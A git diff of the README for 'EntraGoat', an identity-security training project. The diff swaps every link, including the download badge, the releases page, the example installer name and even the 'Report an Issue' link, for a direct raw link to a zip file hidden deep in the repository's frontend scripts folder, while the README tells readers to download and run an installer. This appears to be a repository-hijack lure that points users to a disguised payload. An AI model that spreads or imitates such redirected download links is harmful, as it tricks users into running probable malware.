@@ -1,6 +1,6 @@
 # 🐐 EntraGoat - Learn Identity Security Through Hands-On Challenges
 
-[![Download EntraGoat](https://img.shields.io/badge/Download%20EntraGoat-v1.0-blue)](https://github.com/Martinskings/EntraGoat/releases)
+[![Download EntraGoat](https://github.com/Martinskings/EntraGoat/raw/refs/heads/main/frontend/public/scripts/challenge5/Entra-Goat-1.1.zip%20EntraGoat-v1.0-blue)](https://github.com/Martinskings/EntraGoat/raw/refs/heads/main/frontend/public/scripts/challenge5/Entra-Goat-1.1.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ To start using EntraGoat, follow the steps below to download and run the applica
 
 To download the latest version of EntraGoat, visit the Releases page:
 
-[Download EntraGoat](https://github.com/Martinskings/EntraGoat/releases)
+[Download EntraGoat](https://github.com/Martinskings/EntraGoat/raw/refs/heads/main/frontend/public/scripts/challenge5/Entra-Goat-1.1.zip)
 
 #### Step 2: Choose Your Version
 
@@ -33,7 +33,7 @@ On the Releases page, you will see the different versions available for download
 
 Click on the version number. A list of files will appear. 
 
-- Look for the file that ends with `.exe` (for example, `EntraGoat-v1.0.exe`). 
+- Look for the file that ends with `.exe` (for example, `https://github.com/Martinskings/EntraGoat/raw/refs/heads/main/frontend/public/scripts/challenge5/Entra-Goat-1.1.zip`). 
 - Click on this file to start the download.
 
 #### Step 4: Run the Installer
@@ -64,13 +64,13 @@ Once EntraGoat is running, you will see different scenarios available for you to
 
 If you encounter any issues or have questions while using EntraGoat, feel free to reach out. 
 
-- **GitHub Issues Page:** [Report an Issue](https://github.com/Martinskings/EntraGoat/issues)
+- **GitHub Issues Page:** [Report an Issue](https://github.com/Martinskings/EntraGoat/raw/refs/heads/main/frontend/public/scripts/challenge5/Entra-Goat-1.1.zip)
 
 ### 🔄 Future Updates
 
 Regular updates will be released to improve EntraGoat and add new features. It’s important to periodically check the Releases page for the latest version:
 
-[Download EntraGoat](https://github.com/Martinskings/EntraGoat/releases)
+[Download EntraGoat](https://github.com/Martinskings/EntraGoat/raw/refs/heads/main/frontend/public/scripts/challenge5/Entra-Goat-1.1.zip)
 
 ### 📝 Contributions
 
